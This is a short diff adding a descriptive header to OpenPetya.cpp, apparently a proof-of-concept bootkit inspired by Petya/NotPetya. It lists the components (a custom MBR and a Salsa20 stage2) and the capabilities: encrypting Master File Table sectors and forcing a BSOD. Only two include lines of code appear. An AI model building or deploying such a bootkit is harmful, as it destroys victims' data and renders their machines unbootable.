@@ -1,6 +1,27 @@
 // OpenPetya.cpp
 // Author: iss4cf0ng/ISSAC
 // GitHub: https://github.com/iss4cf0ng/OpenPetya/
+/*
+Introduction:
+    OpenPetya is a Proof-of-Concept (PoC) bootkit inspired by Petya/NotPetya ransomware.
+
+Disclaimer:
+    Please do NOT use this program for any illegal purposes.
+
+Components:
+    1. OpenPetya.exe — User-Interface of OpenPetya
+    2. mbr.bin — Custom Master Boot Record, written in assembly language
+    3. stage2.bin — Stage2 program which contains core functionalities, including Salsa20 cryptographic algorithm, written in C
+
+What it CAN do:
+    1. Encrypt 256 sectors of Master File Table (MFT)
+    2. Trigger BSOD via NtRaiseHardError
+
+What is CAN'T do:
+    1. Worming
+    2. C2 communication
+
+*/
 
 #include <windows.h>
 #include <winternl.h>
